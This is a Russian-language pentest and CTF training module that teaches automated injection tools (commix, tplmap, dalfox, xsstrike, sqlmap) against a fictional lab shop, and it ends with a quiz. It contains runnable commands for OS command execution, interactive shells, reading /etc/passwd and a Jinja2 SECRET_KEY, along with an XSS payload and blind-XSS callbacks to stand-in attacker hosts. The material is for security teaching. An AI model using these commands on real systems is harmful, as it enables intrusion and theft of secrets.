---
id: web-tool-injection-tools
title: "commix, tplmap, dalfox: инструменты инъекций (RCE, SSTI, XSS)"
category: web
parent: web-tools-exploit
difficulty: medium
order: 4
tags: [commix, tplmap, dalfox, xsstrike, ssti, command-injection, xss, rce]
prerequisites: [web-command-injection, web-ssti-core]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Практический справочник по автоматизации инъекций: command injection (commix), SSTI (tplmap), XSS (dalfox/xsstrike) и RCE через sqlmap --os-shell."
lab:
  kind: shell
  title: "Практика: commix/tplmap — command injection и SSTI"
  toolset: [core, curl, commix, tplmap]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - 'commix автоматически тестирует параметр host на command injection.'
    - 'tplmap определяет движок шаблонов (здесь Jinja2).'
    - 'Проверь математикой: {{7*7}} должно вернуть 49.'
    - 'Прочитай конфиг шаблона: {{config}} содержит SECRET_KEY — сохрани в found.txt.'
---

## Задача

На `https://shop.acme-lab.test` есть три параметра, которые пахнут инъекцией. `?host=127.0.0.1` похож на «проверку доступности» (за ним прячется команда ОС). `?name=test` вычисляет шаблон. `?q=test` отражается в HTML. Признак виден, но нужно **перебрать техники и обходы** — ручная скучная работа. Её закрывают специализированные сканеры.

Это справочник: `commix` (command injection), `tplmap` (SSTI), `dalfox`/`xsstrike` (XSS) и RCE через `sqlmap`.

## Данные, с которыми работаем

- `https://shop.acme-lab.test/ping?host=127.0.0.1` — команда ОС.
- `https://shop.acme-lab.test/greet?name=test` — SSTI (`{{7*7}}` → `49`).
- `https://shop.acme-lab.test/search?q=test` — отражение в HTML.
- Запрос `request.txt` с параметром `id` — SQLi (для `--os-shell`).

Шпаргалка «инструмент под класс»:

| Класс / признак | Инструмент | Быстрая команда |
|-----------------|-----------|-----------------|
| Command injection (эхо команды, задержка) | commix | `commix -u '<url>' --batch --os-cmd=id` |
| SSTI (`{{7*7}}`→49) | tplmap | `tplmap -u '<url>' --os-shell` |
| XSS (отражение в HTML) | dalfox | `dalfox url '<url>'` |
| Blind XSS | dalfox | `dalfox url '<url>' -b https://xss.me` |
| Контекстный XSS | xsstrike | `xsstrike.py -u '<url>' --fuzzer` |
| SQLi → RCE | sqlmap | `sqlmap -r req.txt -p id --os-cmd=id` |

## commix: автоматизация command injection

```bash
$ commix -u 'https://shop.acme-lab.test/ping?host=127.0.0.1' --batch --os-cmd='id'
[+] Testing connection... OK
[+] The (host) parameter is vulnerable to Classic injection
[+] OS: Linux
uid=33(www-data) gid=33(www-data)
```

Ключевые флаги:

| Флаг | Что делает |
|------|-----------|
| `-u` / `-r request.txt` | цель по URL / по сырому запросу из Burp |
| `-p host` | тестировать конкретный параметр |
| `--data='ip=1'` | POST-данные |
| `--technique=c,e,t,f,b` | classic/eval/time/file/boolean |
| `--os-cmd='id'` / `--os-shell` | одна команда / интерактивный shell |
| `--file-read=/etc/passwd` | чтение файла |
| `--tamper=space2ifs` | обход фильтра пробелов |
| `--level=3 --risk=2` | глубина и риск |
| `--batch` | без интерактивных вопросов |

Слепая инъекция (без вывода команды) — через задержку:

```bash
$ commix -u 'https://shop.acme-lab.test/ping?host=127.0.0.1' --technique=t --batch
```

## tplmap: SSTI → RCE

`tplmap` определяет **движок шаблонов** и добивает до RCE:

```bash
$ tplmap -u 'https://shop.acme-lab.test/greet?name=test'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:
  Engine: Jinja2
$ tplmap -u 'https://shop.acme-lab.test/greet?name=test' -e jinja2 --os-cmd 'id'
uid=33(www-data) gid=33(www-data)
```

Payload'ы, которые tplmap пробует сам: `{{7*7}}` (Jinja2/Twig), `${7*7}` (Freemarker/Velocity/EL), `<%= 7*7 %>` (ERB), `#{7*7}` (Ruby), `{7*7}` (Smarty). Если движок известен, укажи `-e` и не тратить время. `--os-shell` даёт интерактивный shell.

## dalfox: XSS-сканер

```bash
$ dalfox url 'https://shop.acme-lab.test/search?q=test'
[*] Payload: "><script>alert(1)</script>
[POC] https://shop.acme-lab.test/search?q=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
[V] Reflected XSS found
```

Режимы: `url` (один URL), `pipe` (URL из stdin), `file` (список), `sxss` (stored). Полезные флаги:

| Флаг | Что делает |
|------|-----------|
| `-p q` | конкретный параметр |
| `--data '{"t":"x"}'` + `-H` | POST/JSON |
| `-b https://xss.attacker/cb` | blind-XSS коллбэк |
| `--mining-dom` / `--deep-domxss` | поиск DOM-XSS |
| `--waf-bypass` | обход WAF |
| `--format json -o xss.json` | машинный вывод |
| `-W 10` / `--delay 100` | воркеры / задержка |

**xsstrike** — альтернатива с контекстным анализом: `xsstrike.py -u 'https://shop.acme-lab.test/search?q=test' --fuzzer`.

> Всегда подтверждай XSS вручную: отражение в HTML — ещё не доказательство, нужен сработавший `alert` (скриншот) или blind-callback.

## sqlmap → RCE: `--os-shell` и `--os-cmd`

`sqlmap` не только дампит БД — при достаточных правах он даёт выполнение команд на ОС:

```bash
$ sqlmap -r request.txt -p id --os-cmd 'id'
$ sqlmap -r request.txt -p id --os-shell --web-root '/var/www/html'
$ sqlmap -r request.txt -p id --file-read '/etc/passwd'
```

Ключевые флаги:

| Флаг | Что делает |
|------|-----------|
| `--os-cmd` / `--os-shell` | одна команда / интерактивный OS-shell |
| `--os-pwn` / `--os-smbrelay` | OOB shell / через SMB relay |
| `--file-read` / `--file-write` + `--file-dest` | чтение / запись файла |
| `--sql-shell` / `--sql-query` | SQL-shell / один запрос |
| `--udf-inject` / `--shared-lib` | UDF-инъекция своей .so |
| `--tamper=space2comment` | обход WAF |

**Ограничение:** `--os-shell` требует прав (MySQL `FILE`/`SUPER`, MSSQL `sysadmin`, PostgreSQL `pg_execute_server_program`) и упирается в `secure_file_priv`. Если команды не идут — вернись к UDF/`xp_cmdshell`/`COPY TO PROGRAM`.

## Как инструменты «думают»: выбор техники под сигнал

Сканеры инъекций не «знают» ответ заранее — они строят гипотезу из твоего сигнала и проверяют её по одной технике за раз. Понимание этого порядка экономит часы: ты не гоняешь `commix` вслепую, а даёшь ему правильный вход.

Начнём с command injection. `commix` сначала отправляет безобидный маркер и смотрит, отразился ли он в ответе. Если да — это *classic injection*: результат команды возвращается прямо в теле. Если нет — он переходит к *time-based*: выполняет команду с задержкой и измеряет время ответа. Если и это не сработало — *file-based* (команда пишет результат в файл, который читают отдельно) и *boolean-based* (истина/ложь меняет код ответа). Поэтому первый запуск без флагов честно пробует несколько техник; указание `--technique=c` сразу отсекает лишние.

У `tplmap` логика похожа, но объект другой — движок шаблонов. Инструмент подставляет синтаксис разных движков и смотрит, какой из них вычисляется. `{{7*7}}` — это Jinja2/Twig, `${7*7}` — Freemarker/Velocity/EL, `<%= 7*7 %>` — ERB, `#{7*7}` — Ruby, `{7*7}` — Smarty. Когда движок опознан, `-e jinja2` избавляет от повторного перебора, а `--os-cmd` строит цепочку вызова ОС именно для него.

`dalfox` работает с отражением в HTML. Он не просто шлёт `<script>`, а разбирает контекст: попал ли payload в текст, в атрибут, внутрь `<script>` или в URL. От контекста зависит, сработает ли тег или нужен обработчик события. Именно поэтому у него есть режимы `--mining-dom` и `--deep-domxss` — они ищут пути, где значение обрабатывается уже в браузере, а не на сервере.

И, наконец, `sqlmap` — он про SQL, но умеет выходить в ОС. Ключевое ограничение здесь не техника, а права СУБД: `--os-shell` упирается в `FILE`/`SUPER`, `sysadmin` или `pg_execute_server_program`. Если прав нет, инструмент молча ничего не сделает — и это не «sqlmap сломался», а «на этой СУБД такой путь закрыт».

Общий принцип один: сначала дай инструменту точный сигнал (класс инъекции, известный движок, сырой запрос из Burp), потом позволь ему перебирать техники. Чем меньше гипотез у сканера, тем быстрее и тише он работает.

Отдельно стоит помнить про ложные срабатывания. Сканер может «найти» инъекцию там, где сервер просто вернул ошибку на необычный ввод. Поэтому правило одно: любая находка инструмента — это гипотеза до тех пор, пока ты не воспроизвёл её минимальной командой `curl` и не увидел результат своими глазами. Инструмент экономит время на переборе, но ответственность за доказательство всегда на тестировщике.

## Полный прогон от начала до конца

1. `commix -u '.../ping?host=1' --batch --os-cmd=id` → Classic injection, `uid=33`.
2. `tplmap -u '.../greet?name=x' --os-cmd=id` → Jinja2, RCE.
3. `dalfox url '.../search?q=x'` → reflected XSS + PoC.
4. `sqlmap -r request.txt -p id --os-cmd=id` → RCE через SQLi (если права есть).
5. Каждую находку — подтвердить `curl`-ом.

## Если не сработало

- **commix молчит.** Попробуй `--technique=t` (слепая), `--tamper=space2ifs`, `--level=3`.
- **tplmap не нашёл движок.** Проверь вручную: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
- **dalfox шумит.** Подтверждай руками; WAF — `--waf-bypass`.
- **sqlmap `--os-shell` не даёт команд.** Нет прав или `secure_file_priv` — иди в UDF/`xp_cmdshell`.
- **Слишком шумно.** `--delay`, меньше воркеров, `--batch`; не роняй сервис.

## Что мы теперь знаем

- Каждому классу инъекции — свой инструмент: commix, tplmap, dalfox, sqlmap.
- Все они принимают сырой запрос из Burp (`-r request.txt`) — точное воспроизведение.
- Сканер даёт **кандидата**, а доказательство — ручной `curl`-PoC.
- `sqlmap` умеет выйти за пределы БД в ОС, если есть права.
- Слепые инъекции ловятся по времени (`--technique=t`).

## На что смотреть дальше

- **Контекст важнее payload.** Один и тот же ввод в HTML, атрибуте и JS ведёт себя по-разному.
- **Не убей цель.** `--os-shell`, `--os-pwn`, DoS-тесты — только по согласованию.
- **Версия и права.** RCE через SQLi зависит от прав СУБД.
- **Blind-XSS — долгая игра.** Коллбэк приходит позже, когда админ откроет страницу.
- **Фиксируй тупики.** «UNION не сработал» закрывает ветку.

## Квиз

Проверь себя.

```quiz
- question: "Какой инструмент автоматизирует command injection?"
  options:
    - "dalfox"
    - "commix"
    - "tplmap"
    - "jwt_tool"
  answer: 1
  explanation: "commix обнаруживает и эксплуатирует инъекции команд ОС."
- question: "Что делает ответ 49 на параметр name={{7*7}}?"
  options:
    - "Сервер вернул ошибку"
    - "Шаблонизатор выполнил выражение — это SSTI"
    - "Сработал XSS"
    - "Это SQL-инъекция"
  answer: 1
  explanation: "Вычисление арифметики означает, что сервер исполняет шаблон."
- question: "Зачем dalfox нужен флаг -b?"
  options:
    - "Чтобы задать cookie"
    - "Чтобы указать URL коллбэка для blind-XSS"
    - "Чтобы включить base64"
    - "Чтобы ускорить скан"
  answer: 1
  explanation: "-b/--blind задаёт внешний endpoint, куда сработает слепой XSS."
- question: "Когда sqlmap --os-shell не сработает?"
  options:
    - "Всегда работает"
    - "Когда у СУБД нет прав (FILE/SUPER/sysadmin) или мешает secure_file_priv"
    - "Только на MySQL"
    - "Если нет интернета"
  answer: 1
  explanation: "RCE через SQLi зависит от привилегий СУБД и настроек файловых операций."
- question: "Почему нельзя считать вывод сканера доказательством?"
  options:
    - "Сканеры всегда правы"
    - "Они дают ложные срабатывания; нужен ручной воспроизводимый PoC"
    - "Они медленные"
    - "Они не работают по HTTPS"
  answer: 1
  explanation: "Подтверждай Repeater'ом или curl — только тогда это находка."
```

## Куда дальше

Дальше (`web-playbooks`) мы соберём все инструменты в decision-tree плейбуки «нашёл X → что делать». А пока главное запомни: у каждого класса инъекции — свой сканер, и он даёт кандидата, а не доказательство.

## Где пригодится

- **CTF (Web):** быстро подтвердить и развить инъекцию до RCE/флага.
- **Bug bounty:** корректный PoC повышает шанс валидного отчёта.
- **Пентест:** автоматизация рутины при сохранении ручной верификации.
- **Работа (AppSec):** проверка устойчивости обработки ввода к инъекциям.
